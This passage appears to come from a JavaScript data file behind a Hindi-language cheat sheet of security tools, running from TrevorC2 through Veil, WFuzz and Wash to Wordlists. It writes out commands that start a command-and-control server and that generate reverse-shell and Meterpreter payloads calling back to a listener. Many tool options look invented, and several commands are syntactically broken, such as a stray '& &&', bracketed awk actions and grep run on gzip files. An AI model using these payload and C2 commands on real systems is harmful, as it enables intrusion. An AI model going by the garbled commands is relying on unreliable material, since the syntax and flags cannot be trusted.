      { cmd: "for disk in sdb sdc sdd; do testdisk -q /dev/$disk 2>/dev/null; done", desc: "एकाधिक डिस्क स्कैन" },
      { cmd: "testdisk /dev/sdb -v 2>&1 | tail -20", desc: "अंतिम रिकवरी स्थिति" }
    ],
    script: "echo 'TestDisk डेटा रिकवरी...'\ntestdisk -l /tmp/testdisk_$(date +%Y%m%d).log -v /dev/sdb 2>&1 | tee /tmp/testdisk.log\necho 'रिकवरी पूर्ण, लॉग /tmp/ में'"
  },
  TrevorC2: {
    install: { pkg: "trevor-c2" },
    options: [
      ["-s <host>", "सर्वर होस्ट"],
      ["-p <port>", "सर्वर पोर्ट"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-c <cmd>", "कमांड चलाएँ"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080", desc: "TrevorC2 सर्वर शुरू" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 443 -v", desc: "HTTPS C2 सर्वर" },
      { cmd: "python2 trevorc2_server.py -s example.com -p 80", desc: "डोमेन C2" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -l 192.168.1.10 -P 4444", desc: "लिसनर C2" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -d", desc: "डीबग C2 मोड" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -r /etc/trevorc2/config.json", desc: "कॉन्फ़िग से C2" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8888 -v", desc: "पोर्ट 8888 C2" },
      { cmd: "python2 trevorc2_client.py -s example.com -p 8080", desc: "TrevorC2 क्लाइंट" },
      { cmd: "python2 trevorc2_server.py -c 'generate agent python'", desc: "एजेंट जनरेट" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -q", desc: "शांत C2" }
    ],
    advanced: [
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -v -l 192.168.1.10 -P 4444 2>&1 | tee trevorc2.log", desc: "C2 सर्वर लॉग" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -v 2>&1 | grep -i 'session\\;connect'", desc: "सेशन कनेक्शन मॉनिटर" },
      { cmd: "python2 trevorc2_server.py -c 'generate agent powershell' > agent.ps1", desc: "PowerShell एजेंट" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 & && python2 trevorc2_client.py -s 127.0.0.1 -p 8080", desc: "सर्वर और क्लाइंट" },
      { cmd: "python2 trevorc2_server.py -s 0.0.0.0 -p 8080 -v 2>&1 | awk '/agent|beacon/{print}'", desc: "एजेंट बीकन फ़िल्टर" }
    ],
    script: "echo 'TrevorC2 C2 शुरू...'\npython2 trevorc2_server.py -s 0.0.0.0 -p 8080 -l 192.168.1.10 -P 4444 -v 2>&1 | tee /tmp/trevorc2.log &\necho 'C2 पोर्ट 8080 पर चल रहा है'"
  },
  Twofi: {
    install: { pkg: "twofi" },
    options: [
      ["-i <file>", "इनपुट फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-n", "नंबर जोड़ें"],
      ["-u", "अपरकेस जोड़ें"],
      ["-l <len>", "न्यूनतम लंबाई"],
      ["-m <len>", "अधिकतम लंबाई"],
      ["-s <chars>", "विशेष वर्ण"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "twofi -i tweets.txt -o wordlist.txt", desc: "ट्वीट से वर्डलिस्ट" },
      { cmd: "twofi -i text.txt -o custom.dict -n", desc: "नंबर के साथ वर्डलिस्ट" },
      { cmd: "twofi -i /var/log/auth.log -o pass_candidates.txt", desc: "लॉग से पासवर्ड शब्द" },
      { cmd: "twofi -i input.txt -o output.txt -l 6", desc: "मिन 6 अक्षर शब्द" },
      { cmd: "twofi -i input.txt -o words.txt -u", desc: "अपरकेस शब्द शामिल" },
      { cmd: "twofi -i data.txt -o dictionary.txt -s '@#$'", desc: "विशेष वर्णों के साथ" },
      { cmd: "twofi -i input.txt -o output.txt -v", desc: "वर्बोज़ मोड" },
      { cmd: "twofi -i text.txt -o dict.txt -q", desc: "शांत मोड" },
      { cmd: "twofi -i corpus.txt -o wordlist.txt -l 4 -m 12", desc: "4-12 अक्षर शब्द" },
      { cmd: "twofi -i input.txt -o custom.lst -n -u -s '_'", desc: "पूर्ण कस्टम शब्द" }
    ],
    advanced: [
      { cmd: "twofi -i input.txt -o wordlist.txt -l 4 -m 16 -n -u -s '!@#' 2>&1 | tee twofi.log", desc: "पूर्ण वर्डलिस्ट जनरेशन लॉग" },
      { cmd: "twofi -i text.txt -o - | sort -u > sorted_wordlist.txt", desc: "अद्वितीय शब्दों की सॉर्टेड लिस्ट" },
      { cmd: "twofi -i /var/log/syslog -o /tmp/syslog_words.txt -v 2>&1 | grep -i 'found\\;total'", desc: "सिसलॉग से शब्द निकालें" },
      { cmd: "for f in *.txt; do twofi -i $f -o ${f}.wordlist; done", desc: "सभी फ़ाइलों से शब्द" },
      { cmd: "cat /var/log/*.log | twofi -i - -o combined_words.txt", desc: "सभी लॉग से शब्द पाइप" }
    ],
    script: "echo 'वर्डलिस्ट जनरेट कर रहा है...'\ncat /var/log/*.log 2>/dev/null | twofi -i - -o /tmp/custom_wordlist.txt -l 6 -m 16 -n -u 2>/dev/null\nsort -u /tmp/custom_wordlist.txt > /tmp/final_wordlist.txt\necho 'वर्डलिस्ट /tmp/final_wordlist.txt में:' $(wc -l < /tmp/final_wordlist.txt)"
  },
  URLCrazy: {
    install: { pkg: "url-crazy" },
    options: [
      ["-d <domain>", "डोमेन"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-p", "प्रिंट सभी"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-t <type>", "टाइप फ़िल्टर"],
      ["-c", "CSV आउटपुट"],
      ["-m <min>", "न्यूनतम दूरी"],
      ["-x", "एक्सटेंशन जाँच"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "urlcrazy -d example.com", desc: "URL टाइपोस्क्वैटिंग खोजें" },
      { cmd: "urlcrazy -d example.com -o variations.txt", desc: "वेरिएशन फ़ाइल में सेव" },
      { cmd: "urlcrazy -d example.com -p", desc: "सभी वेरिएशन प्रिंट" },
      { cmd: "urlcrazy -d example.com -v", desc: "वर्बोज़ URL खोज" },
      { cmd: "urlcrazy -d example.com -t homophone", desc: "होमोफ़ोन URL खोजें" },
      { cmd: "urlcrazy -d example.com -c -o report.csv", desc: "CSV रिपोर्ट" },
      { cmd: "urlcrazy -d example.com -s", desc: "साइलेंट मोड" },
      { cmd: "urlcrazy -d example.com -m 1", desc: "न्यूनतम 1 कैरेक्टर बदलाव" },
      { cmd: "urlcrazy -d example.com -x -o with_ext.txt", desc: "एक्सटेंशन के साथ" },
      { cmd: "urlcrazy -d example.com -t insertion", desc: "इंसर्शन वेरिएशन" }
    ],
    advanced: [
      { cmd: "urlcrazy -d example.com -p -v 2>&1 | tee urlcrazy.log", desc: "पूर्ण URL वेरिएशन लॉग" },
      { cmd: "urlcrazy -d example.com -c -o urls.csv 2>&1 && awk -F',' '{print $1}' urls.csv", desc: "CSV से URL निकालें" },
      { cmd: "for domain in $(cat domains.txt); do urlcrazy -d $domain -s; done > all_variations.txt", desc: "एकाधिक डोमेन" },
      { cmd: "urlcrazy -d example.com -v 2>&1 | grep -i 'registered\\;live'", desc: "रजिस्टर्ड URL फ़िल्टर" },
      { cmd: "urlcrazy -d example.com -p 2>&1 | awk '{print $2}' | sort -u", desc: "अद्वितीय वेरिएशन निकालें" }
    ],
    script: "echo 'URL टाइपोस्क्वैटिंग खोज...'\nurlcrazy -d example.com -p -v -o /tmp/url_variations.txt 2>&1 | tee /tmp/urlcrazy.log\ngrep -i 'registered' /tmp/urlcrazy.log > /tmp/registered_domains.txt\necho 'रजिस्टर्ड डोमेन /tmp/registered_domains.txt में'"
  },
  Unicornscan: {
    install: { pkg: "unicornscan" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-p <ports>", "पोर्ट रेंज"],
      ["-s <type>", "स्कैन प्रकार"],
      ["-r <rate>", "पैकेट दर"],
      ["-H <host>", "लक्ष्य होस्ट"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-l", "लॉग मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "unicornscan -i eth0 192.168.1.1:1-1000", desc: "होस्ट पोर्ट स्कैन" },
      { cmd: "unicornscan -i eth0 -p 1-65535 192.168.1.1", desc: "पूर्ण पोर्ट रेंज स्कैन" },
      { cmd: "unicornscan -i eth0 -s tcp 192.168.1.1:80,443", desc: "TCP पोर्ट स्कैन" },
      { cmd: "unicornscan -i eth0 -r 1000 192.168.1.1:1-10000", desc: "तेज़ पोर्ट स्कैन" },
      { cmd: "unicornscan -i eth0 -H 192.168.1.1 -p 1-5000 -v", desc: "वर्बोज़ पोर्ट स्कैन" },
      { cmd: "unicornscan -i eth0 192.168.1.0/24:22,80,443", desc: "सबनेट पोर्ट स्कैन" },
      { cmd: "unicornscan -i eth0 -s udp 192.168.1.1:161", desc: "UDP SNMP पोर्ट स्कैन" },
      { cmd: "unicornscan -i eth0 -o scan.txt 192.168.1.1:1-1000", desc: "आउटपुट फ़ाइल" },
      { cmd: "unicornscan -i eth0 -q 192.168.1.1:1-1000", desc: "शांत स्कैन" },
      { cmd: "unicornscan -i eth0 -l 192.168.1.1:1-1000", desc: "लॉग मोड स्कैन" }
    ],
    advanced: [
      { cmd: "unicornscan -i eth0 -r 5000 -v 192.168.1.1:1-65535 2>&1 | tee uscan.log", desc: "हाई-स्पीड पूर्ण स्कैन लॉग" },
      { cmd: "unicornscan -i eth0 -s tcp 192.168.1.0/24:22,80,443,445 2>&1 | grep -i 'open'", desc: "खुले पोर्ट फ़िल्टर" },
      { cmd: "nmap -sS 192.168.1.0/24 -p 80 -oG - | grep 'open' | awk '{print $2}' | xargs -I{} unicornscan -i eth0 {}:1-10000", desc: "nmap से लक्ष्य पाइप" },
      { cmd: "unicornscan -i eth0 -r 10000 192.168.1.1:1-1000 -v 2>&1 | awk '/open/{print $3, $5}'", desc: "खुले पोर्ट और सेवा" },
      { cmd: "for ip in $(seq 1 254); do unicornscan -i eth0 -q 192.168.1.$ip:22,80,443; done", desc: "सबनेट तेज़ स्कैन" }
    ],
    script: "echo 'Unicornscan पोर्ट स्कैन...'\nunicornscan -i eth0 -r 1000 -v 192.168.1.1:1-10000 2>&1 | tee /tmp/unicornscan.log\ngrep 'open' /tmp/unicornscan.log > /tmp/open_ports.txt\necho 'खुले पोर्ट /tmp/open_ports.txt में'"
  },
  Veil: {
    install: { pkg: "veil" },
    options: [
      ["-p <payload>", "पेलोड चुनें"],
      ["-c <compiler>", "कंपाइलर"],
      ["-o <file>", "आउटपुट"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-t <type>", "परिवहन"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "veil -p python/shellcode_inject/base64_reverse_tcp -l 192.168.1.10 -P 4444 -o payload.py", desc: "Python रिवर्स शेल जनरेट" },
      { cmd: "veil -p c/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o payload.c", desc: "C Meterpreter जनरेट" },
      { cmd: "veil -p powershell/meterpreter/rev_https -l example.com -P 443 -o payload.ps1", desc: "PowerShell HTTPS पेलोड" },
      { cmd: "veil -p go/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o payload.go", desc: "Go Meterpreter जनरेट" },
      { cmd: "veil -p perl/shellcode_inject/base64_reverse_tcp -l 192.168.1.10 -P 4444 -o payload.pl", desc: "Perl रिवर्स शेल" },
      { cmd: "veil -p ruby/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o payload.rb", desc: "Ruby Meterpreter" },
      { cmd: "veil -p python/shellcode_inject/base64_reverse_tcp -l 192.168.1.10 -P 4444 -o payload.py -v", desc: "वर्बोज़ Python पेलोड" },
      { cmd: "veil -p auto/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o payload", desc: "ऑटो Meterpreter पेलोड" },
      { cmd: "veil -p c/meterpreter/rev_http -l example.com -P 80 -o payload.c", desc: "HTTP C Meterpreter" },
      { cmd: "veil -r /etc/veil/resources.rc", desc: "रीसोर्स फ़ाइल चलाएँ" }
    ],
    advanced: [
      { cmd: "veil -p python/shellcode_inject/base64_reverse_tcp -l 192.168.1.10 -P 4444 -o /tmp/payload.py -v 2>&1 | tee veil.log", desc: "पूर्ण पेलोड जनरेशन लॉग" },
      { cmd: "veil -p c/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o payload && x86_64-w64-mingw32-gcc payload.c -o payload.exe", desc: "C पेलोड कंपाइल करें" },
      { cmd: "veil -p python/shellcode_inject/base64_reverse_tcp -l 192.168.1.10 -P 4444 -o - | base64 -d", desc: "पेलोड stdout और डीकोड" },
      { cmd: "for lang in python c powershell go; do veil -p ${lang}/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o payload_${lang}; done", desc: "सभी भाषाओं में पेलोड" },
      { cmd: "veil -p auto/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -v 2>&1 | grep -i 'generated\\;saved'", desc: "जनरेटेड पेलोड फ़ाइल फ़िल्टर" }
    ],
    script: "echo 'Veil पेलोड जनरेट कर रहा है...'\nveil -p python/shellcode_inject/base64_reverse_tcp -l 192.168.1.10 -P 4444 -o /tmp/payload.py 2>/dev/null\nveil -p c/meterpreter/rev_tcp -l 192.168.1.10 -P 4444 -o /tmp/payload.c 2>/dev/null\necho 'पेलोड /tmp/ में जनरेट हुए'"
  },
  WFuzz: {
    install: { pkg: "w-fuzz" },
    options: [
      ["-w <file>", "वर्डलिस्ट फ़ाइल"],
      ["-u <url>", "लक्ष्य URL"],
      ["-p <proxy>", "प्रॉक्सी"],
      ["-c <cookie>", "कुकी"],
      ["-H <header>", "हेडर"],
      ["-t <threads>", "थ्रेड्स"],
      ["-s <delay>", "विलंब"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ", desc: "डायरेक्टरी ब्रूटफ़ोर्स" },
      { cmd: "wfuzz -w users.txt -u http://example.com/login.php?user=FUZZ&pass=test", desc: "यूज़र ब्रूटफ़ोर्स" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -t 50", desc: "50 थ्रेड डायर स्कैन" },
      { cmd: "wfuzz -c -w wordlist.txt -u http://example.com/FUZZ -p 127.0.0.1:8080", desc: "प्रॉक्सी के साथ फ़ज़" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -H 'Cookie: session=abc'", desc: "कुकी के साथ फ़ज़" },
      { cmd: "wfuzz -w params.txt -u http://example.com/page.php?FUZZ=1", desc: "पैरामीटर फ़ज़िंग" },
      { cmd: "wfuzz -w extensions.txt -u http://example.com/indexFUZZ", desc: "एक्सटेंशन फ़ज़िंग" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -v", desc: "वर्बोज़ डायर स्कैन" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -s 1", desc: "1 सेकंड विलंब" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -o output.txt", desc: "आउटपुट फ़ाइल" }
    ],
    advanced: [
      { cmd: "wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ -t 100 -v 2>&1 | tee wfuzz.log", desc: "तेज़ डायर स्कैन लॉग" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -H 'Authorization: Bearer token' -p 127.0.0.1:8080", desc: "प्रमाणीकृत प्रॉक्सी फ़ज़" },
      { cmd: "wfuzz -w wordlist.txt -u http://example.com/FUZZ -v 2>&1 | grep -i '200 OK\\;302 Found'", desc: "सफल HTTP कोड फ़िल्टर" },
      { cmd: "for ext in php asp aspx jsp; do wfuzz -w dirs.txt -u \"http://example.com/FUZZ.$ext\"; done", desc: "एक्सटेंशन वार स्कैन" },
      { cmd: "wfuzz -z range,1-1000 -u http://example.com/page.php?id=FUZZ -v 2>&1", desc: "रेंज फ़ज़िंग" }
    ],
    script: "echo 'WFuzz डायर स्कैन...'\nwfuzz -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ -t 50 -v 2>&1 | tee /tmp/wfuzz.log\ngrep -E '200|301|302' /tmp/wfuzz.log > /tmp/found_paths.txt\necho 'मिले पथ /tmp/found_paths.txt में'"
  },
  Wapiti: {
    install: { pkg: "wapiti" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-x <url>", "बाहर करें URL"],
      ["-p <proxy>", "प्रॉक्सी"],
      ["-c <file>", "कुकी फ़ाइल"],
      ["-t <threads>", "थ्रेड्स"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-m <module>", "मॉड्यूल"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "wapiti -u http://example.com", desc: "वेब कमज़ोरी स्कैन" },
      { cmd: "wapiti -u http://example.com -m sql,xss", desc: "SQL और XSS स्कैन" },
      { cmd: "wapiti -u http://example.com -o /report", desc: "रिपोर्ट डायरेक्टरी" },
      { cmd: "wapiti -u http://example.com -o /report -v", desc: "वर्बोज़ स्कैन" },
      { cmd: "wapiti -u http://example.com -x http://example.com/logout", desc: "URL बाहर करें" },
      { cmd: "wapiti -u http://example.com -p http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ स्कैन" },
      { cmd: "wapiti -u http://example.com -c cookies.txt", desc: "कुकी फ़ाइल के साथ" },
      { cmd: "wapiti -u http://example.com -t 20", desc: "20 थ्रेड स्कैन" },
      { cmd: "wapiti -u http://example.com -m all", desc: "सभी मॉड्यूल स्कैन" },
      { cmd: "wapiti -u http://example.com -q", desc: "शांत मोड" }
    ],
    advanced: [
      { cmd: "wapiti -u http://example.com -m all -o /report -v 2>&1 | tee wapiti.log", desc: "पूर्ण स्कैन लॉग" },
      { cmd: "wapiti -u http://example.com -m sql,xss,ldap -c cookies.txt -p http://127.0.0.1:8080 -t 10", desc: "लक्षित मॉड्यूल प्रॉक्सी स्कैन" },
      { cmd: "wapiti -u http://example.com -v 2>&1 | grep -i 'vuln\\;found'", desc: "कमज़ोरियाँ फ़िल्टर" },
      { cmd: "for url in $(cat targets.txt); do wapiti -u $url -m sql -o /reports/$(echo $url | tr '/' '_'); done", desc: "एकाधिक URL SQL स्कैन" },
      { cmd: "wapiti -u http://example.com -v 2>&1 | awk '/SQL|XSS|LFI/{print}'", desc: "SQL/XSS/LFI कमज़ोरी फ़िल्टर" }
    ],
    script: "echo 'Wapiti वेब स्कैन शुरू...'\nwapiti -u $1 -m all -o /tmp/wapiti_report -v 2>&1 | tee /tmp/wapiti.log\ngrep 'vuln' /tmp/wapiti.log > /tmp/vulnerabilities.txt\necho 'रिपोर्ट: /tmp/wapiti_report'"
  },
  Wash: {
    install: { pkg: "wash" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-b <bssid>", "BSSID फ़िल्टर"],
      ["-c <ch>", "चैनल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-t <sec>", "स्कैन समय"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-s", "साइलेंट"],
      ["-f", "फ़िल्टर AP"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "wash -i wlan0mon", desc: "WPS AP स्कैन करें" },
      { cmd: "wash -i wlan0mon -c 6", desc: "चैनल 6 WPS स्कैन" },
      { cmd: "wash -i wlan0mon -o wps_scan.txt", desc: "WPS AP सूची फ़ाइल में" },
      { cmd: "wash -i wlan0mon -b 00:11:22:33:44:55", desc: "विशिष्ट AP WPS जाँच" },
      { cmd: "wash -i wlan0mon -v", desc: "वर्बोज़ WPS स्कैन" },
      { cmd: "wash -i wlan0mon -q", desc: "शांत WPS स्कैन" },
      { cmd: "wash -i wlan0mon -s", desc: "साइलेंट मोड" },
      { cmd: "wash -i wlan0mon -f", desc: "फ़िल्टर AP मोड" },
      { cmd: "wash -i wlan1mon -c 1", desc: "चैनल 1 WPS स्कैन" },
      { cmd: "wash -i wlan0mon -t 30", desc: "30 सेकंड स्कैन" }
    ],
    advanced: [
      { cmd: "wash -i wlan0mon -c 6 -o wps.txt -v 2>&1 | tee wash.log", desc: "WPS स्कैन लॉग" },
      { cmd: "wash -i wlan0mon -v 2>&1 | grep -i 'WPS\\;Locked\\;vuln'", desc: "WPS लॉक स्थिति फ़िल्टर" },
      { cmd: "wash -i wlan0mon -o - 2>&1 | awk 'NR>1 {print $1, $3}' > wps_aps.txt", desc: "BSSID और चैनल निकालें" },
      { cmd: "airmon-ng start wlan0 && wash -i wlan0mon -o /tmp/wps_scan.txt -v 2>&1", desc: "मॉनिटर मोड और WPS स्कैन" },
      { cmd: "wash -i wlan0mon -v 2>&1 | awk '/WPS v/[print $1, $2, $3]'", desc: "WPS संस्करण फ़िल्टर" }
    ],
    script: "airmon-ng start wlan0\necho 'WPS AP स्कैन कर रहा है...'\nwash -i wlan0mon -o /tmp/wps_scan.txt -v 2>&1 | tee /tmp/wash.log\ngrep -E '[0-9A-F]{2}:' /tmp/wps_scan.txt > /tmp/wps_aps.txt\necho 'WPS AP /tmp/wps_aps.txt में'"
  },
  WebSploit: {
    install: { pkg: "web-sploit" },
    options: [
      ["-s <host>", "लक्ष्य होस्ट"],
      ["-p <port>", "पोर्ट"],
      ["-m <module>", "मॉड्यूल"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-o <file>", "आउटपुट"],
      ["-l", "लिस्ट मॉड्यूल"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-t <threads>", "थ्रेड्स"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "websploit", desc: "WebSploit कंसोल शुरू" },
      { cmd: "websploit -m web/fuzz_dir -s http://example.com", desc: "डायर फ़ज़िंग मॉड्यूल" },
      { cmd: "websploit -m web/exploit -s example.com -p 80", desc: "वेब एक्सप्लॉइट" },
      { cmd: "websploit -l", desc: "मॉड्यूल सूची दिखाएँ" },
      { cmd: "websploit -m wlan/wifi_attack -s 192.168.1.1", desc: "WiFi अटैक मॉड्यूल" },
      { cmd: "websploit -m web/sqlmap -s http://example.com/page.php?id=1", desc: "SQLmap मॉड्यूल" },
      { cmd: "websploit -m web/dir_scanner -s http://example.com -t 20", desc: "20 थ्रेड डायर स्कैन" },
      { cmd: "websploit -m web/php_code_injector -s http://example.com", desc: "PHP कोड इंजेक्शन" },
      { cmd: "websploit -r /etc/websploit/script.ws", desc: "रीसोर्स स्क्रिप्ट" },
      { cmd: "websploit -m web/fuzz_dir -s http://example.com -v", desc: "वर्बोज़ फ़ज़िंग" }
    ],
    advanced: [
      { cmd: "websploit -m web/dir_scanner -s http://example.com -t 50 -v 2>&1 | tee ws.log", desc: "डायर स्कैन लॉग" },
      { cmd: "echo -e 'use web/dir_scanner\nset TARGET http://example.com\nrun' > script.ws && websploit -r script.ws", desc: "स्क्रिप्ट फ़ाइल से" },
      { cmd: "websploit -m web/fuzz_dir -s http://example.com -v 2>&1 | grep -i 'found\\;200'", desc: "मिली डायरेक्टरी फ़िल्टर" },
      { cmd: "for mod in web/dir_scanner web/fuzz_dir web/sqlmap; do websploit -m $mod -s http://example.com -q; done", desc: "एकाधिक मॉड्यूल" },
      { cmd: "websploit -m web/exploit -s example.com -p 80 -v 2>&1 | tail -15", desc: "एक्सप्लॉइट आउटपुट" }
    ],
    script: "echo 'WebSploit फ़्रेमवर्क...'\ncat > /tmp/script.ws << EOF\nuse web/dir_scanner\nset TARGET http://example.com\nrun\nEOF\nwebsploit -r /tmp/script.ws 2>&1 | tee /tmp/websploit.log"
  },
  WhatWeb: {
    install: { pkg: "what-web" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-p <proxy>", "प्रॉक्सी"],
      ["-c <cookie>", "कुकी"],
      ["-t <threads>", "थ्रेड्स"],
      ["-H <header>", "हेडर"],
      ["-a <level>", "एग्रेसिविटी लेवल"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "whatweb http://example.com", desc: "वेब तकनीक पहचान" },
      { cmd: "whatweb http://example.com -v", desc: "वर्बोज़ तकनीक पहचान" },
      { cmd: "whatweb http://example.com -o report.html", desc: "HTML रिपोर्ट जनरेट" },
      { cmd: "whatweb http://example.com -q", desc: "शांत मोड" },
      { cmd: "whatweb http://example.com -p http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ" },
      { cmd: "whatweb http://example.com -c 'PHPSESSID=abc123'", desc: "कुकी के साथ स्कैन" },
      { cmd: "whatweb http://example.com -t 10", desc: "10 थ्रेड्स के साथ" },
      { cmd: "whatweb http://example.com -H 'User-Agent: Mozilla/5.0'", desc: "कस्टम हेडर" },
      { cmd: "whatweb http://example.com -a 3", desc: "एग्रेसिविटी लेवल 3" },
      { cmd: "whatweb http://example.com/blog", desc: "विशिष्ट पथ स्कैन" }
    ],
    advanced: [
      { cmd: "whatweb http://example.com -v -a 3 -o whatweb_report.html 2>&1 | tee whatweb.log", desc: "पूर्ण एग्रेसिव स्कैन लॉग" },
      { cmd: "whatweb http://example.com -v 2>&1 | grep -i 'WordPress\\;Joomla\\;Drupal'", desc: "CMS प्रकार फ़िल्टर" },
      { cmd: "for url in $(cat targets.txt); do whatweb $url -q -o whatweb_$(echo $url | tr '/' '_').html; done", desc: "एकाधिक URL स्कैन" },
      { cmd: "whatweb http://example.com -v -p http://127.0.0.1:8080 -c 'auth=admin' 2>&1", desc: "प्रमाणीकृत प्रॉक्सी स्कैन" },
      { cmd: "whatweb http://example.com -v 2>&1 | awk '/Server|X-Powered|Apache|Nginx/{print}'", desc: "वेब सर्वर जानकारी" }
    ],
    script: "echo 'WhatWeb वेब तकनीक पहचान...'\nwhile read url; do\n  whatweb $url -v -o \"whatweb_$(echo $url | md5sum | cut -c1-8).html\" 2>/dev/null\ndone < targets.txt\necho 'सभी स्कैन पूर्ण'"
  },
  Wordlists: {
    install: { pkg: "wordlists" },
    options: [
      ["-l", "सूची दिखाएँ"],
      ["-i <file>", "जानकारी दिखाएँ"],
      ["-s <str>", "खोजें"],
      ["-o <file>", "आउटपुट"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["--help", "सहायता"],
      ["-c", "गिनती"],
      ["-n", "लाइन नंबर"],
      ["-e", "एक्सट्रैक्ट"]
    ],
    basic: [
      { cmd: "ls /usr/share/wordlists/", desc: "उपलब्ध वर्डलिस्ट सूची" },
      { cmd: "wc -l /usr/share/wordlists/rockyou.txt.gz", desc: "रॉकयू वर्डलिस्ट गिनती" },
      { cmd: "head -100 /usr/share/wordlists/rockyou.txt.gz", desc: "पहले 100 पासवर्ड" },
      { cmd: "grep -i 'admin' /usr/share/wordlists/rockyou.txt.gz", desc: "admin स्ट्रिंग खोज" },
      { cmd: "ls -la /usr/share/wordlists/", desc: "वर्डलिस्ट विवरण" },
      { cmd: "zcat /usr/share/wordlists/rockyou.txt.gz | sort -u > sorted.txt", desc: "सॉर्टेड वर्डलिस्ट" },
      { cmd: "zcat /usr/share/wordlists/rockyou.txt.gz | grep -E '^.{8}$' > 8char.txt", desc: "8 कैरेक्टर पासवर्ड" },
      { cmd: "ls /usr/share/seclists/", desc: "SecLists सूची" },
      { cmd: "zcat /usr/share/wordlists/rockyou.txt.gz | head -1000 > sample.txt", desc: "1000 पासवर्ड का नमूना" },
      { cmd: "cat /usr/share/wordlists/fasttrack.txt | wc -l", desc: "FastTrack शब्द गिनती" }
    ],
    advanced: [
      { cmd: "zcat /usr/share/wordlists/rockyou.txt.gz | pv -l | grep -E '^.{6,8}$' > /tmp/6-8char.txt", desc: "प्रोग्रेस के साथ फ़िल्टर" },
      { cmd: "zcat /usr/share/wordlists/rockyou.txt.gz | grep -i '^[a-z]*$' | sort -u > alpha_only.txt", desc: "सिर्फ़ वर्णमाला पासवर्ड" },
      { cmd: "for f in /usr/share/wordlists/*.gz; do echo $(basename $f): $(zcat $f | wc -l); done > wordlist_stats.txt", desc: "सभी वर्डलिस्ट आँकड़ा" },
      { cmd: "crunch 6 8 abcdef1234 -o /tmp/custom.txt && cat /tmp/custom.txt | head -100", desc: "crunch से वर्डलिस्ट" },
      { cmd: "zcat /usr/share/wordlists/rockyou.txt.gz | grep -cE '[A-Z]' > capital_count.txt", desc: "अपरकेस अक्षरों वाली गिनती" }
    ],
    script: "echo 'वर्डलिस्ट उपयोगिता...'\necho 'उपलब्ध वर्डलिस्ट:'\nls -lh /usr/share/wordlists/*.gz 2>/dev/null | awk '{print $5, $NF}'\necho ''\necho 'रॉकयू से 8-12 अक्षर के पासवर्ड:'\nzcat /usr/share/wordlists/rockyou.txt.gz | grep -E '^.{8,12}$' | head -20"
  },
  Xplico: {
    install: { pkg: "xplico" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-r <file>", "PCAP फ़ाइल"],
